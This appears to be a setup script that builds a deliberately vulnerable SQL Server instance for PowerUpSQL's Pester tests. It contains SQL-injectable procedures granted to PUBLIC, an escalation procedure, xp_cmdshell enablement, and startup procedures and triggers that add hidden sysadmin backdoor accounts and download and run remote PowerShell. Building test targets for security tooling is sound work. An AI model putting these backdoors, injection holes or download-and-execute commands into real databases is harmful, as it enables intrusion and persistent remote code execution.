-- Script: PowerUpSQL_PesterDb.sql
-- Description: This is a script for setting up the local SQL Server instance for Pester Tests.

------------------------------------------------------------
-- Create Test SQL Logins
------------------------------------------------------------

-- Select master database
USE master
GO
 
--- Create least privilege server login
If not Exists (select loginname from master.dbo.syslogins where name = 'user')
CREATE LOGIN [user] WITH PASSWORD = 'user', CHECK_POLICY = OFF;
GO

-- Create sysadmin server login
If not Exists (select loginname from master.dbo.syslogins where name = 'admin')
CREATE LOGIN [admin] WITH PASSWORD = 'admin', CHECK_POLICY = OFF;
EXEC sp_addsrvrolemember 'admin', 'sysadmin';
GO

-- Create impersonation login 1
If not Exists (select loginname from master.dbo.syslogins where name = 'impuser1')
CREATE LOGIN [impuser1] WITH PASSWORD = 'impuser1', CHECK_POLICY = OFF;
GO

-- Grant impersonate on sa to impuser1
GRANT IMPERSONATE ON LOGIN::sa to [impuser1];
GO

-- Create impersonation login 2
If not Exists (select loginname from master.dbo.syslogins where name = 'impuser2')
CREATE LOGIN [impuser2] WITH PASSWORD = 'impuser2', CHECK_POLICY = OFF;
GO

-- Grant impersonate on impuser1 to impuser2
GRANT IMPERSONATE ON LOGIN::impuser2 to [impuser2];
GO

-- Create impersonation login 3
If not Exists (select loginname from master.dbo.syslogins where name = 'impuser3')
CREATE LOGIN [impuser3] WITH PASSWORD = 'impuser2', CHECK_POLICY = OFF;
GO

-- Grant impersonate on impuser2 to impuser3
GRANT IMPERSONATE ON LOGIN::impuser1 to [impuser3];
GO

-- Create db_owner login
If not Exists (select loginname from master.dbo.syslogins where name = 'dbouser')
CREATE LOGIN [dbouser] WITH PASSWORD = 'dbouser', CHECK_POLICY = OFF;
GO

-- Create server link login
If not Exists (select loginname from master.dbo.syslogins where name = 'linkuser')
CREATE LOGIN [linkuser] WITH PASSWORD = 'linkuser', CHECK_POLICY = OFF;
GO

-- Create ddladmin login
If not Exists (select loginname from master.dbo.syslogins where name = 'ddladminuser')
CREATE LOGIN [ddladminuser] WITH PASSWORD = 'ddladminuser', CHECK_POLICY = OFF;
GO

------------------------------------------------------------
-- Create Test Databases
------------------------------------------------------------

-- Create testdb for senstive data tests
If not Exists (select name from master.dbo.sysdatabases where name = 'testdb')
CREATE DATABASE testdb
GO

-- Create testdb2 for db_owner tests
If not Exists (select name from master.dbo.sysdatabases where name = 'testdb2')
CREATE DATABASE testdb2
GO

------------------------------------------------------------
-- Create Test Database Users
------------------------------------------------------------

-- Select testdb2 database
USE testdb2 
GO

-- Set testdb2 as the default db for dbouser
ALTER LOGIN [dbouser] with default_database = [testdb2];
GO

-- Create database user for dbouser login
If not Exists (SELECT name FROM sys.database_principals where name = 'dbouser')
CREATE USER [dbouser] FROM LOGIN [dbouser];
GO

-- Add the dbouser database user to the db_owner role in the testdb2 database
EXEC sp_addrolemember [db_owner], [dbouser];
GO

-- Set testdb2 as the default db for ddladminuser
ALTER LOGIN [ddladminuser] with default_database = [testdb2];
GO

-- Create database user for ddladminuser login
If not Exists (SELECT name FROM sys.database_principals where name = 'ddladminuser')
CREATE USER [ddladminuser] FROM LOGIN [ddladminuser];
GO

-- Add the ddladminuser database user to the db_ddladmin role in the testdb2 database
EXEC sp_addrolemember [db_ddladmin], [ddladminuser];
GO

-- Select master database
USE master
GO

-- Create database user for user login
If not Exists (SELECT name FROM sys.database_principals where name = 'user')
CREATE USER [user] FROM LOGIN [user];
GO

-- Provide the user database user with the CREATE PROCEDURE privilege in the master db
GRANT CREATE PROCEDURE TO [user]


------------------------------------------------------------
-- Create Test Tables
------------------------------------------------------------

-- Select testdb databases
USE testdb
GO

-- Create noclist table for ownership chaining test
If not Exists (SELECT name FROM sys.tables WHERE name = 'NOCList')
CREATE TABLE dbo.NOCList
(SpyName text NOT NULL,RealName text NULL)
GO

-- Create tracking table for sensitive data test
If not Exists (SELECT name FROM sys.tables WHERE name = 'tracking')
 CREATE TABLE [dbo].[tracking](
	[card] [varchar](50) NULL
) ON [PRIMARY]
GO

-- Create secrets table for sensitive data test
If not Exists (SELECT name FROM sys.tables WHERE name = 'secrets')
CREATE TABLE [dbo].[secrets](
	[password] [nchar](200) NULL
) ON [PRIMARY]
GO


------------------------------------------------------------
-- Create Test Records
------------------------------------------------------------

-- Select testdb database
USE testdb
GO

-- Add sample records to nolist table for ownership chaining test
If Exists (SELECT name FROM sys.tables WHERE name = 'NOCList')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Sean Connery')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Ethan Hunt','Tom Cruise')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Jason Bourne','Matt Damon')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Daniel Craig')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Pierce Bronsan')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Roger Moore')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Timothy Dolton')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','George Lazenby')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Harry Hart',' Colin Firth')
GO

-- Select testdb database
USE testdb
GO

-- Add sample records to tracking table for sensitive data test
If Exists (SELECT name FROM sys.tables WHERE name = 'tracking')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('6011998081409707')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('4012888888881881')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('601199808140asdf')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('40128888888')
GO

-- Select testdb database
USE testdb
GO

-- Add sample records to secrets table for sensitive data test
If Exists (SELECT name FROM sys.tables WHERE name = 'secrets')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('password1')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('password2')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('password23')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('SueprPassword123!')
GO


------------------------------------------------------------
-- Setup Test Server Configurations
------------------------------------------------------------

-- Set master as trustworthy
ALTER DATABASE master SET TRUSTWORTHY ON
GO

-- Enable xp_cmdshell
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO
 
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO


------------------------------------------------------------
-- Create Audit, Server Spec, and Database Spec
------------------------------------------------------------

-- Select master database
USE master
GO
 
-- Create audit
CREATE SERVER AUDIT Audit_Object_Changes
TO APPLICATION_LOG
WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE)
ALTER SERVER AUDIT Audit_Object_Changes
WITH (STATE = ON)
GO

-- Create server audit specification
CREATE SERVER AUDIT SPECIFICATION Audit_Server_Level_Object_Changes
FOR SERVER AUDIT Audit_Object_Changes
ADD (SERVER_OBJECT_CHANGE_GROUP),
ADD (SERVER_OBJECT_PERMISSION_CHANGE_GROUP),
ADD (SERVER_PERMISSION_CHANGE_GROUP),
ADD (SERVER_PRINCIPAL_IMPERSONATION_GROUP)
WITH (STATE = ON)
GO

-- Create the database audit specification
CREATE DATABASE AUDIT SPECIFICATION Audit_Database_Level_Object_Changes
FOR SERVER AUDIT Audit_Object_Changes
ADD (DATABASE_OBJECT_CHANGE_GROUP) 
WITH (STATE = ON)
GO


------------------------------------------------------------
-- Create Test Procedures
------------------------------------------------------------

-- Select master database
USE master
GO

-- Create procedure vulnerable to SQL injection
CREATE PROCEDURE sp_sqli1
@DbName varchar(max)
WITH EXECUTE AS OWNER
AS
BEGIN
Declare @query as varchar(max)
SET @query = 'SELECT name FROM master..sysdatabases where name like ''%'+ @DbName+'%'' OR name=''tempdb''';
EXECUTE(@query)
END
GO
 
-- Allow members of PUBLIC to execute it
GRANT EXECUTE ON sp_sqli1 to PUBLIC
GO

-- Select master database
USE master
GO

-- Create proc to add sysadmin
CREATE PROCEDURE sp_add_backdoor_account
AS
CREATE LOGIN backdoor_account WITH PASSWORD = 'backdoor_account', CHECK_POLICY = OFF;
EXEC sp_addsrvrolemember 'backdoor_account', 'sysadmin';
GO
 
-- Create proc to download and run powershell code
CREATE PROCEDURE sp_add_backdoor
AS
-- Download and execute PowerShell code from the internet
EXEC master..xp_cmdshell 'powershell -C "Invoke-Expression (new-object System.Net.WebClient).DownloadString(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1'')"'
GO

-- Configure stored procedures to run at startup
-- Set 'sp_add_backdoor_account' to auto run
EXEC sp_procoption @ProcName = 'sp_add_backdoor_account',
@OptionName = 'startup',
@OptionValue = 'on';
GO
 
-- Setup 'sp_add_backdoor' to auto run
EXEC sp_procoption @ProcName = 'sp_add_backdoor',
@OptionName = 'startup',
@OptionValue = 'on';
GO


-- Select testdb2 database
USE testdb2
GO

-- Create procedure to add dbouser to the sysadmin fixed server role (should be execute as db_owner)
CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'dbouser','sysadmin'
GO

CREATE PROCEDURE sp_sqli2
@DbName varchar(max)
AS
BEGIN
Declare @query as varchar(max)
SET @query = 'SELECT name FROM master..sysdatabases where name like ''%'+ @DbName+'%'' OR name=''tempdb''';
EXECUTE(@query)
END
GO

-- Allow members of PUBLIC to execute it
GRANT EXECUTE ON sp_sqli2 to PUBLIC
GO


------------------------------------------------------------
-- Create Test Triggers
------------------------------------------------------------

-- Select master database
USE master
GO

-- Create the DDL trigger
CREATE Trigger [persistence_ddl_1]
ON ALL Server
FOR DDL_LOGIN_EVENTS
AS
 
-- Download and run a PowerShell script from the internet
EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_ddl.ps1'')"';
 
-- Add a sysadmin named 'SysAdmin_DDL' if it doesn't exist
if (SELECT count(name) FROM sys.sql_logins WHERE name like 'SysAdmin_DDL') = 0
 
	-- Create a login
	CREATE LOGIN SysAdmin_DDL WITH PASSWORD = 'SysAdmin_DDL', CHECK_POLICY = OFF;;
	
	-- Add the login to the sysadmin fixed server role
	EXEC sp_addsrvrolemember 'SysAdmin_DDL', 'sysadmin';
GO

-- Select testdb database
USE testdb
GO
 
-- Create the DML trigger
CREATE TRIGGER [persistence_dml_1]
ON testdb.dbo.NOCList 
FOR INSERT, UPDATE, DELETE AS
 
-- Download a PowerShell script from the internet to memory and execute it
EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_dml.ps1'')"';
 
-- Add a sysadmin named 'SysAdmin_DML' if it doesn't exist
if (select count(*) from sys.sql_logins where name like 'SysAdmin_DML') = 0
 
	-- Create a login
	CREATE LOGIN SysAdmin_DML WITH PASSWORD = 'SysAdmin_DML', CHECK_POLICY = OFF;;
	
	-- Add the login to the sysadmin fixed server role
	EXEC sp_addsrvrolemember 'SysAdmin_DML', 'sysadmin';
GO


------------------------------------------------------------
-- Create Test Keys, Certificates, and Cert Logins
------------------------------------------------------------

-- Create a master key for the database
CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'SuperSecretPasswordHere!';
GO

-- Create certificate for the sp_sqli2 procedure
CREATE CERTIFICATE sp_sqli2_cert
WITH SUBJECT = 'This should be used to sign the sp_sqli2',
EXPIRY_DATE = '2050-10-20';
GO

-- Create cert login
If not Exists (select loginname from master.dbo.syslogins where name = 'certuser')
CREATE LOGIN certuser
FROM CERTIFICATE sp_sqli2_cert

-- Add cert to stored procedure
If not Exists (select loginname from master.dbo.syslogins where name = 'certuser')
ADD SIGNATURE to sp_sqli2
BY CERTIFICATE sp_sqli2_cert;
GO

-- Add the certuser to the sysadmin role
If not Exists (select loginname from master.dbo.syslogins where name = 'certuser')
EXEC sp_addsrvrolemember 'certuser', 'sysadmin';
GO
